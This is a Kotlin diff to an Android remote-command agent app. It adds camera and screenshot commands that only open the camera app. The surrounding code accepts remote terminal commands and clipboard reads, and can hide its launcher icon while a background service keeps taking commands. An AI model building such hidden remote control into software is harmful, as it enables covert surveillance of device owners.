@@ -64,8 +64,8 @@ class CommandExecutor @Inject constructor(
         // Ilovalar
         "open_app", "open_url", "share_text", "open_settings", "set_alarm",
         "list_installed_apps",
-        // Kamera / xotira
-        "open_camera",
+        // Kamera / screenshot
+        "open_camera", "take_screenshot",
         // Kuchli (cheklangan, xavfli buyruqlar hali ham blocklist bilan himoyalangan)
         "terminal_command",
         "clipboard_sync", "voice_record",
@@ -115,8 +115,10 @@ class CommandExecutor @Inject constructor(
                     "open_settings" -> openSettings()
                     "set_alarm" -> setAlarm(cmd.params)
                     "list_installed_apps" -> listInstalledApps()
+                    "open_camera" -> openCamera()
                     "terminal_command" -> terminalCommand(cmd.params)
                     "clipboard_sync" -> getClipboard()
+                    "take_screenshot" -> takeScreenshot()
                     "voice_record" -> CommandResult.Err("voice_record hali qo'llab-quvvatlanmaydi")
                     "hide_app" -> hideApp()
                     "show_app" -> showApp()
@@ -526,6 +528,32 @@ class CommandExecutor @Inject constructor(
     // MainActivity'ning o'zi emas, faqat launcher'dagi activity-alias'ni
     // yoqadi/o'chiradi — shu bois AgentForegroundService (fon xizmati) hech
     // qachon to'xtamaydi, buyruqlarni doim qabul qilaveradi.
+
+    private fun openCamera(): CommandResult {
+        return try {
+            val intent = Intent(android.provider.MediaStore.INTENT_ACTION_STILL_IMAGE_CAMERA).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            context.startActivity(intent)
+            CommandResult.Ok("Kamera ilovasi ochildi.")
+        } catch (_: Exception) {
+            CommandResult.Err("Kamera ilovasi topilmadi.")
+        }
+    }
+
+    private fun takeScreenshot(): CommandResult {
+        // Android 9+ da Screenshot API mavjud emas — foydalanuvchi ekranini majburan suratga olish
+        // tizim ruxsatisiz mumkin emas. Uning o'rniga kamera ilovasini ochamiz.
+        return try {
+            val intent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            context.startActivity(intent)
+            CommandResult.Ok("Kamera ochildi. Screenshot olish uchun kamera ilovasidan foydalaning.")
+        } catch (_: Exception) {
+            CommandResult.Err("Kamera ilovasi topilmadi.")
+        }
+    }
 
     private fun hideApp(): CommandResult {
         val alias = ComponentName(context, "uz.jarvis.agent.LauncherAlias")
